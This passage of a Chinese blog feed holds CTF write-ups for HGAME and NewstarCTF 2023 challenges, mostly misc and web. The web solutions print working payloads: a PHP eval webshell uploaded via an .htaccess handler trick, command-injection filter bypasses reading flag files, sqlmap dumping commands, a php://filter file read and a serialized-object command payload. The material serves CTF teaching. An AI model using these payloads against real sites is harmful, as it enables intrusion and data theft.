src="https://s2.loli.net/2024/03/08/EinY8ygt56xeTZL.png" alt=""></p><p>stegseek 把题目的 png 跑了下</p><p>密码是 123456，解得新的一张 png</p><p><img src="https://s2.loli.net/2024/03/08/oM8mkAQ4qIBtO5u.png" alt=""></p><p>星尘文字 <a href="https://my1l.github.io/Ctrl/CtrlAstr.html">https://my1l.github.io/Ctrl/CtrlAstr.html</a></p><blockquote><p>看的眼睛都瞎了</p></blockquote><p><strong>hgame{welc0me!}</strong></p><h3 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a><strong>ek1ng_want_girlfriend</strong></h3><p>流量签到，一打开就看到一个 jpg 的流量，dump 下来就是 flag</p><p><img src="https://s2.loli.net/2024/03/08/vkoidnSt84qebZP.png" alt=""></p><h3 id="ezWord"><a href="#ezWord" class="headerlink" title="ezWord"></a><strong>ezWord</strong></h3><p>拿到 word 文档，转 zip 后缀，子目录里看到两张一样的图和一个加密的 zip</p><p><img src="https://s2.loli.net/2024/03/08/OgoEwkLanYQ4H51.png" alt=""></p><p>python3 盲水印解得 zip 的解压密码 T1hi3sI4sKey</p><p><img src="https://s2.loli.net/2024/03/08/y2Ve1UTlnWH6qJC.png" alt=""></p><p>解压后得到一篇文章，结合提示（解密两次）</p><p>第一个是 spam</p><p><img src="https://s2.loli.net/2024/03/08/SzpC4qUNc9s7vWM.png" alt=""></p><p>第二个需要先把这些汉字转 unicode 编码<br><a href="https://www.haomeili.net/HanZi/ZiFuBianMaZhuanHuan">https://www.haomeili.net/HanZi/ZiFuBianMaZhuanHuan</a></p><p><img src="https://s2.loli.net/2024/03/08/zAnND6pkMCdurfm.png" alt=""></p><p>去掉后缀 7C，通过观察以及 flag 头是 hgame 这一信息，将这一串 16 进制的字符向前移位 9 位</p><p><img src="https://s2.loli.net/2024/03/08/mQ8iw364Dnp7JSt.png" alt=""></p><p>查 ascii 表发现 68 就是 h，67 就是 g，对照翻译即可</p><p><img src="https://s2.loli.net/2024/03/08/h3E9QNqbvFVymju.png" alt=""></p><h3 id="龙之舞"><a href="#龙之舞" class="headerlink" title="龙之舞"></a>龙之舞</h3><p>AU 打开音频在频谱图处看到 key</p><p><img src="https://s2.loli.net/2024/03/08/1udN3BrhjqlS2ov.png" alt=""></p><p>水平翻转 + 旋转 180° 得到正确的 key</p><p><img src="https://s2.loli.net/2024/03/08/AFp7bc4QIPxhZN5.png" alt=""></p><p>根据文件名 deepsound_of_dragon_dance.wav</p><p>将音频文件放入 deepsounde，使用上面的 key 得到一张 gif 图</p><p><img src="https://s2.loli.net/2024/03/08/u7nIko4rASg9CeL.png" alt=""></p><p>逐帧观察得到四张二维码角，使用 ps 拼接在一起</p><p><img src="https://s2.loli.net/2024/03/08/Ng53ZYFuUQzdRkO.png" alt=""></p><p>扫不了码，对应题目描述</p><p><img src="https://s2.loli.net/2024/03/08/DVjA3I5JGhxXfPL.png" alt=""></p><p>使用 <a href="https://merri.cx/qrazybox/">https://merri.cx/qrazybox/</a></p><p><img src="https://s2.loli.net/2024/03/08/2M9BegazUC3RXdm.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/cUkKbGCTMwXAOER.png" alt=""></p><p>将 editor 切换为 decode 模式，点击 decode 得到 flag</p><p><img src="https://s2.loli.net/2024/03/08/iq5Sacw87Fuvoth.png" alt=""></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a><strong>ezHTTP</strong></h3><p><strong>User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</strong></p><p><strong>x-real-ip: 127.0.0.1</strong></p><p><strong>referer: vidar.club</strong></p><p><img src="https://s2.loli.net/2024/03/08/DqHN7MX8AKVsTRb.png" alt=""></p><h3 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a><strong>Bypass it</strong></h3><p><img src="https://s2.loli.net/2024/03/08/ODnZl9dBXw1ythq.png" alt=""></p><p>注册不给，关掉 js 后发现可以注册了</p><p>随便弄用户名和密码后注册，再打开 js 显示注册成功，登录即可得到 flag</p><h3 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select <strong>Courses</strong></h3><p>仿真现实选课系统，时不时会出现空位，编写脚本实现当出现空位时选课即可</p><p>官方脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&quot;http://106.14.57.14:32274&quot;</span>)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">courses_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    course = &#123;</span><br><span class="line">        <span class="string">&#x27;panel&#x27;</span>: <span class="string">f&#x27;//*[@id=&quot;selector-container&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[1]&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;status&#x27;</span>: <span class="string">f&#x27;//*[@id=&quot;selectorcontainer&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[2]/table/tbody/tr/td[5]&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">f&#x27;//*[@id=&quot;selectorcontainer&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[2]/table/tbody/tr/td[6]/button&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    courses_list.append(course)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(courses_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> courses_list:</span><br><span class="line">    driver.refresh() </span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> course <span class="keyword">in</span> courses_list:</span><br><span class="line">        panel = driver.find_element(By.XPATH, course[<span class="string">&#x27;panel&#x27;</span>])</span><br><span class="line">        panel.click() </span><br><span class="line">        status_element = driver.find_element(By.XPATH, course[<span class="string">&#x27;status&#x27;</span>])</span><br><span class="line">        status_text = status_element.text </span><br><span class="line">        <span class="built_in">print</span>(status_text)</span><br><span class="line">        <span class="keyword">if</span> status_text != <span class="string">&quot;已满&quot;</span>:</span><br><span class="line">            submit_button = driver.find_element(By.XPATH, course[<span class="string">&#x27;submit&#x27;</span>])</span><br><span class="line">            submit_button.click()</span><br><span class="line">            WebDriverWait(driver, <span class="number">5</span>).until(EC.alert_is_present())</span><br><span class="line">            alert = driver.switch_to.alert</span><br><span class="line">        </span><br><span class="line">            alert.accept()</span><br><span class="line">            courses_list.remove(course)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">sleep(<span class="number">10</span>) </span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/bJRclGTQpzXeK3v.png" alt=""></p><h3 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a><strong>What the cow say?</strong></h3><p>一打开是一个提交请求的框</p><p>随机发一些内容看看</p><p><img src="https://s2.loli.net/2024/03/08/fiKduIHU8GWglZS.png" alt=""></p><p>经过多次尝试后</p><p>猜测后台是 eval(@_POST[‘user_input’]) 并且带有 waf</p><p>分号被过滤，还过滤了许多关键词字</p><p>尝试使用 echo 配合反引号的命令执行，发现 echo 也被过滤，利用正则匹配[]来绕过</p><p><img src="https://s2.loli.net/2024/03/08/acHDi9Mh4RbQG2T.png" alt=""></p><p>执行成功，继续 e[b-d]ho <code>tac /f*</code></p><p><img src="https://s2.loli.net/2024/03/08/DJvKUSp1VnO4ig7.png" alt=""></p><p>发现是文件夹，继续向下 ls 看看</p><p><img src="https://s2.loli.net/2024/03/08/glPfev9nRd1ujzJ.png" alt=""></p><p>再 tac 一次得到 flag</p><p><img src="https://s2.loli.net/2024/03/08/xP1frgH8C7GNKZX.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewstarCTF 2023</title>
      <link href="/posts/NewstarCTF2023.html"/>
      <url>/posts/NewstarCTF2023.html</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="WEEK1-泄漏的秘密"><a href="#WEEK1-泄漏的秘密" class="headerlink" title="[WEEK1]泄漏的秘密"></a>[WEEK1]泄漏的秘密</h3><p> 备份文件泄露</p><p>Dirsearch 扫到 www.zip</p><p><img src="https://s2.loli.net/2024/03/08/2LjWAMxwH9IYlVp.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/dJrjB2qeyN34SLT.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/EOZnLRvl7IQgY6K.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/kO2hNvJjpTKrcow.png" alt=""></p><h3 id="WEEK1-Begin-of-Upload"><a href="#WEEK1-Begin-of-Upload" class="headerlink" title="[WEEK1]Begin of Upload"></a>[WEEK1]Begin of Upload</h3><p>文件上传 一句话木马 js 前端绕过</p><p>正常传一句话木马</p><p><img src="https://s2.loli.net/2024/03/08/ClwhGc2BSaMDzkQ.png" alt=""></p><p>按要求改 php 为 jpg，上传抓包把后缀名改回 php 之后发现成功</p><p><img src="https://s2.loli.net/2024/03/08/OVpy2h9MtTCrxSv.png" alt=""></p><p>访问执行命令抓 flag 即可</p><p><img src="https://s2.loli.net/2024/03/08/balIKzu6WFNDh8L.png" alt=""></p><p>直接关掉 js 也可以</p><p><img src="https://s2.loli.net/2024/03/08/9Qv8aTZ4SGylYXo.png" alt=""></p><h3 id="WEEK1-ErrorFlask"><a href="#WEEK1-ErrorFlask" class="headerlink" title="[WEEK1]ErrorFlask"></a>[WEEK1]ErrorFlask</h3><p>报错回显</p><p><img src="https://s2.loli.net/2024/03/08/k12mf4wRgN7PbtU.png" alt=""></p><p>类似一个加法计算器的功能</p><p><img src="https://s2.loli.net/2024/03/08/BeMtEL9JvZ5KQPr.png" alt=""></p><p>传值为字符时报错</p><p><img src="https://s2.loli.net/2024/03/08/zZjdNtOanKr9EPg.png" alt=""></p><p>源码搜到 flag…</p><h3 id="WEEK1-Begin-of-Http"><a href="#WEEK1-Begin-of-Http" class="headerlink" title="[WEEK1]Begin of Http"></a>[WEEK1]Begin of Http</h3><p>http 协议伪造</p><p>同 moectf 2023 web http</p><p>paylaod：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /?ctf=<span class="number">1</span> </span><br><span class="line">User-Agent: NewStarCTF2023</span><br><span class="line">Referer:newstarctf.com</span><br><span class="line">Cookie: power=ctfer</span><br><span class="line">X-Real-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">secret=n3wst4rCTF2023g00000d</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/va8kqch6d2RDofK.png" alt=""></p><h3 id="WEEK1-Begin-of-PHP"><a href="#WEEK1-Begin-of-PHP" class="headerlink" title="[WEEK1]Begin of PHP"></a>[WEEK1]Begin of PHP</h3><p> php 特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**Level 1</p><p>md5的弱类型比较  </p><p>Leve1 2</p><p>md5和sha1的强类型比较</p><p>数组绕过**</p><p><a href="https://blog.csdn.net/cosmoslin/article/details/120973888?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=sha1%E5%BC%BA%E7%B1%BB%E5%9E%8B&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-120973888.142^v94^chatsearchT3_1&amp;spm=1018.2226.3001.4187">PHP—MD5和sha1绕过_php字符串弱不等,sha1强相等-CSDN博客</a><br>**Level 3</p><p>考察strcmp()漏洞</p><p>数组绕过**</p><p><a href="https://blog.csdn.net/cosmoslin/article/details/120973888?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=sha1%E5%BC%BA%E7%B1%BB%E5%9E%8B&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-120973888.142^v94^chatsearchT3_1&amp;spm=1018.2226.3001.4187">Strcmp()函数漏洞_strcmp漏洞_cop_g的博客-CSDN博客</a><br>**Level 4</p><p>Is_numric() 检查变量是否为数字或数字字符串</p><p>php中数组一定大于数字类型</p><p>数组绕过**</p><p><a href="https://blog.csdn.net/qq_45694932/article/details/120162029">php 数组和数字类型的比较 - 建伟F4nniu - 博客园</a><br>**Level 5</p><p>要求所有post传参的值都不能为数字和大小写字母（标点符号绕过）</p><p>并且要flag5变量为真（只要里面有值就为真）</p><p>extract()漏洞导致$flag5可被覆盖**</p><p><a href="https://blog.csdn.net/qq_43677324/article/details/88361892">extract变量覆盖漏洞-CSDN博客</a></p><p><img src="https://s2.loli.net/2024/03/08/VAXfPzWoOtEucQY.png" alt=""></p><h3 id="WEEK1-R-C-E"><a href="#WEEK1-R-C-E" class="headerlink" title="[WEEK1]R!C!E!"></a>[WEEK1]R!C!E!</h3><p> md5 爆破，非法参数名，关键字过滤</p><p><img src="https://s2.loli.net/2024/03/08/zwVySHvo9c2xaIM.png" alt=""></p><p><strong>题目要求 md5($password)的前六位为 c4d038，这里用爆破脚本</strong></p><p><strong>gpt 写的简单代码，凑合用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target_prefix = <span class="string">&#x27;c4d038&#x27;</span>  <span class="comment"># 目标前缀</span></span><br><span class="line">characters = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>  <span class="comment"># 可能的字符集</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐个尝试所有可能的组合</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> characters:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> characters:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> characters:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> characters:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> characters:          <span class="comment">##要爆破几位就多几个</span></span><br><span class="line">                    potential_text = a + b + c + d + e <span class="comment">##这里也要加上</span></span><br><span class="line">                    md5_hash = hashlib.md5(potential_text.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> md5_hash.startswith(target_prefix):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;找到匹配的原文:&quot;</span>, potential_text)</span><br><span class="line">                        exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;未找到匹配的原文&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/sk59biYepxBfTOX.png" alt=""></p><p><strong>e_v.a.l 涉及非法变量名</strong></p><p><strong>谈一谈 PHP 中关于非法参数名传参问题_php 的非法传参-CSDN 博客</strong></p><p><strong>system 用 echo 绕过，cat 用 tac 绕过，flag 用法 f*绕过，ls 可以用 dir 绕过</strong></p><p><strong>更多姿势 **</strong>RCE 总结_C1yas0 的博客-CSDN 博客**</p><p><img src="https://s2.loli.net/2024/03/08/Zk3SPOuoYzaw9N7.png" alt=""></p><h3 id="WEEK1-EasyLogin"><a href="#WEEK1-EasyLogin" class="headerlink" title="[WEEK1]EasyLogin"></a>[WEEK1]EasyLogin</h3><p>密码爆破，越权</p><p><img src="https://s2.loli.net/2024/03/08/e9VrM5RIjZWcPQL.png" alt=""></p><p>admin 123456  默认登录</p><p><img src="https://s2.loli.net/2024/03/08/ZOGR4mEizJAhuj5.png" alt=""></p><p>这里用 bp 字典爆破账户和密码即可</p><p><img src="https://s2.loli.net/2024/03/08/s4CnOqxkc6H1QLz.png" alt=""></p><p>密码被 md5 加密了，爆破时加上 md5 条件即可</p><p><a href="https://blog.csdn.net/weixin_43487849/article/details/116084562">BurpSuite 爆破(Intruder)模块四种模式介绍-CSDN 博客</a></p><p><img src="https://s2.loli.net/2024/03/08/GpB3gwaUNIbZSnX.png" alt=""></p><p>字典自己做，这里直接说明 admin 000000 为账号密码（也算是常规密码，建议是试出来的，节省时间）</p><p><img src="https://s2.loli.net/2024/03/08/H3v6qykJLNMxrmZ.png" alt=""></p><p>抓登录的包发送可以看到一个 passport/xxx.php 的目录</p><p>直接访问是不行的，这里抓访问的包</p><p><img src="https://s2.loli.net/2024/03/08/5wQzM3vZEHATamD.png" alt=""></p><p>注意这里是 post 请求，要把 passport 的值传进去，这里先 load URL 然后在 URL 处添加目录即可</p><p>BP 抓包，发包</p><p><img src="https://s2.loli.net/2024/03/08/ZgYkvcXMUD62aHG.png" alt=""></p><blockquote><p>手快一点哦)</p></blockquote><h3 id="WEEK2-游戏高手"><a href="#WEEK2-游戏高手" class="headerlink" title="[WEEK2] 游戏高手"></a>[WEEK2] 游戏高手</h3><p> js</p><p>js 文件中找到对应成绩的参数</p><p><img src="https://s2.loli.net/2024/03/08/BsewK7SMDOzn2dJ.png" alt=""></p><p>控制台：</p><p>var gameScore=9999999999999</p><p>再玩游戏直接送</p><p><img src="https://s2.loli.net/2024/03/08/7d8OrhaTXACcfiq.png" alt=""></p><h3 id="WEEK2-include-0。0"><a href="#WEEK2-include-0。0" class="headerlink" title="[WEEK2] include 0。0"></a>[WEEK2] include 0。0</h3><p>文件包含</p><p><img src="https://s2.loli.net/2024/03/08/JdpyB5r3C9hRNil.png" alt=""></p><p><a href="https://cloud.tencent.com/developer/article/2145160">CTF 中文件包含的几种不常规利用姿势总结</a></p><p><strong>?file=php://filter/convert.iconv.ASCII.UCS-2BE/resource=flag.php</strong></p><h3 id="WEEK2-ez-sql"><a href="#WEEK2-ez-sql" class="headerlink" title="[WEEK2] ez_sql"></a>[WEEK2] ez_sql</h3><p>常规 sql 注入</p><blockquote><p>手工注入不作演示，这里用 sqlmap</p></blockquote><p>sqlmap -u <a href="http://e36154c0-2c7a-4875-b4e1-fe82c84fb5fc.node4.buuoj.cn:81/?id">http://e36154c0-2c7a-4875-b4e1-fe82c84fb5fc.node4.buuoj.cn/?id</a>=</p><p>发现可以通过 get id 进行 sql 注入</p><p>xxx —dbs  查所有库</p><p><img src="https://s2.loli.net/2024/03/08/qhRSlP68pZQHYfA.png" alt=""></p><p>xxx -D ctf —tables  查表</p><p><img src="https://s2.loli.net/2024/03/08/KM24mXP13DoCfkh.png" alt=""></p><p>xxx -D ctf -T here_is_flag —columns   查字段</p><p><img src="https://s2.loli.net/2024/03/08/zsXP9YtOGgMWC7i.png" alt=""></p><p>xxx -D ctf -T here_is_flag -C flag —dump  查内容</p><p><img src="https://s2.loli.net/2024/03/08/RvNfFUuY5G8dE9p.png" alt=""></p><h3 id="WEEK2-Upload-again"><a href="#WEEK2-Upload-again" class="headerlink" title="[WEEK2] Upload again!"></a>[WEEK2] Upload again!</h3><p>一句话木马写法，.htaccess</p><p><img src="https://s2.loli.net/2024/03/08/4dUtQigIxuynwb5.png" alt=""></p><p><strong>后缀不能是php，那就得传.htaccess试试了</strong></p><p><img src="https://s2.loli.net/2024/03/08/1WyRzwrj5AK6Xv9.png" alt=""></p><blockquote><p>更多写法：</p><FilesMatch "xxx.jpg"> #指定文件转 phpSetHandler application/x-httpd-php</FilesMatch></blockquote><p><strong>功能：把当前目录和子目录的.jpg文件当作php文件处理，再次上传木马</strong></p><p><img src="https://s2.loli.net/2024/03/08/uDOlTySgmHRzwcZ.png" alt=""></p><p><strong>木马格式修改为：<script language='php'>@eval($_POST['aaa']);</script><br>等同于&lt;?php eval($_POST[‘aaa’]); ?&gt;<br>这次成功了，执行系统命令即可</strong></p><p><img src="https://s2.loli.net/2024/03/08/8f7Rtga9pYFxXOI.png" alt=""></p><h3 id="WEEK2-Unserialize？"><a href="#WEEK2-Unserialize？" class="headerlink" title="[WEEK2]  Unserialize？"></a>[WEEK2]  Unserialize？</h3><p> 签到反序列化</p><p>构造 payload：</p><p><img src="https://s2.loli.net/2024/03/08/OD6WZBERn78ozxH.png" alt=""></p><p><strong>POST：unser=O:4:”evil”:1:{s:3:”cmd”;s:33:”nl /th1s_1s_fffflllll4444aaaggggg”;}</strong></p><p><img src="https://s2.loli.net/2024/03/08/GCHsR7jvXLoFWmp.png" alt=""></p><h3 id="WEEK2-R-C-E"><a href="#WEEK2-R-C-E" class="headerlink" title="[WEEK2]   R!!C!!E!!"></a>[WEEK2]   